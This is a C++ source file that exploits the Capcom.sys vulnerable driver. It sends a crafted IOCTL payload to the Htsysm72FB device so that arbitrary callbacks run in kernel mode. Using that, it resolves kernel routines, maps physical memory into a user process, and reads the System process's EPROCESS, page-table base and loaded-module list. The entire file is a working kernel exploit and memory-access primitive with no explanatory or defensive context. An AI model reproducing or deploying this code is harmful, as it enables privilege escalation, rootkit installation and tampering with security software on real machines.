#include "driver.hpp"

#include <memory>
#include <mutex>

#include "../memory/memory.hpp"
#include "../native/native.hpp"
#include "capcom.hpp"
#include "payload.hpp"

auto capcom::dispatch(native::MmGetSystemRoutineAddress_t MmGetSystemRoutineAddress) -> void
{
	dispatch_user_function(MmGetSystemRoutineAddress);
}

capcom::driver::driver()
{
	handle = native::handle_t(CreateFileA("\\\\.\\Htsysm72FB", FILE_ALL_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL));
}

auto capcom::driver::execute(const std::function<void(native::MmGetSystemRoutineAddress_t)>& function) -> void
{
	std::lock_guard<std::mutex> lock(capcom::dispatch_mutex);

	capcom::dispatch_user_function = function;

	auto payload = std::make_unique<capcom::payload>();
	payload->assemble((std::uintptr_t)&capcom::dispatch);

	DWORD output_buffer;
	DWORD bytes_returned;

	DeviceIoControl(handle.get(), 0xAA013044, (void*)payload->get(), sizeof(payload), &output_buffer, sizeof(output_buffer), &bytes_returned, NULL);
}

auto capcom::driver::get_system_function(const std::string& function_name) -> std::uintptr_t
{
	auto iterator = system_functions.find(function_name);

	if (iterator != system_functions.end())
	{
		return iterator->second;
	}

	std::wstring function_name_wide(function_name.begin(), function_name.end());

	auto function_address = get_system_function_remote(function_name_wide);

	if (function_address != 0)
	{
		system_functions.insert_or_assign(function_name, function_address);
	}

	return function_address;
}

auto capcom::driver::get_system_function_remote(const std::wstring& function_name) -> std::uintptr_t
{
	std::uintptr_t address;
	UNICODE_STRING unicode_name;

	RtlInitUnicodeString(&unicode_name, function_name.c_str());

	execute([&](native::MmGetSystemRoutineAddress_t mm_get_system_routine)
	{
		address = (std::uintptr_t)mm_get_system_routine(&unicode_name);
	});

	return address;
}

auto capcom::driver::get_physical_memory_size() -> std::size_t
{
	std::size_t size;

	auto MmGetPhysicalMemoryRanges = get_system_function<native::MmGetPhysicalMemoryRanges_t>("MmGetPhysicalMemoryRanges");

	execute([&](auto)
	{
		auto physical_memory_ranges = MmGetPhysicalMemoryRanges();

		for (std::size_t i = 0;; i++)
		{
			native::PPHYSICAL_MEMORY_RANGE physical_memory_range = &physical_memory_ranges[i];

			if (physical_memory_range->BaseAddress.QuadPart == 0 && physical_memory_range->NumberOfBytes.QuadPart == 0)
			{
				break;
			}

			size = physical_memory_range->BaseAddress.QuadPart + physical_memory_range->NumberOfBytes.QuadPart;
		}
	});

	return size;
}

auto capcom::driver::map_physical_memory(std::uintptr_t base, std::size_t size) -> std::uintptr_t
{
	UNICODE_STRING physical_memory_name;
	RtlInitUnicodeString(&physical_memory_name, L"\\Device\\PhysicalMemory");

	OBJECT_ATTRIBUTES physical_memory_attributes = { 0 };
	InitializeObjectAttributes(&physical_memory_attributes, &physical_memory_name, OBJ_CASE_INSENSITIVE, NULL, NULL);

	auto ZwOpenSection = get_system_function<native::ZwOpenSection_t>("ZwOpenSection");

	HANDLE physical_memory_handle;

	execute([&](auto)
	{
		ZwOpenSection(&physical_memory_handle, SECTION_ALL_ACCESS, &physical_memory_attributes);
	});

	size -= 0x1000;

	native::NtMapViewOfSection(physical_memory_handle, GetCurrentProcess(), &base, 0, 0, NULL, &size, native::SECTION_INHERIT::ViewUnmap, NULL, PAGE_READWRITE);

	CloseHandle(physical_memory_handle);

	return base;
}

auto capcom::driver::get_system_process_eprocess() -> std::uintptr_t
{
	auto PsInitialSystemProcess = get_system_function<std::uintptr_t>("PsInitialSystemProcess");

	execute([&](auto)
	{
		PsInitialSystemProcess = *(std::uintptr_t*)PsInitialSystemProcess;
	});

	return PsInitialSystemProcess;
}

auto capcom::driver::get_system_process_pml4_table_base() -> std::uintptr_t
{
	std::uintptr_t system_process_pml4_table_base = 0;
	auto system_process_eprocess = get_system_process_eprocess();

	execute([&](auto)
	{
		system_process_pml4_table_base = *(std::uintptr_t*)(system_process_eprocess + native::offset_eprocess_DirectoryTableBase);
	});

	return system_process_pml4_table_base;
}

auto capcom::driver::get_loaded_module_list() -> std::uintptr_t
{
	auto PsLoadedModuleList = get_system_function<std::uintptr_t>("PsLoadedModuleList");

	execute([&](auto)
	{
		PsLoadedModuleList = *(std::uintptr_t*)PsLoadedModuleList;
	});

	return PsLoadedModuleList;
}
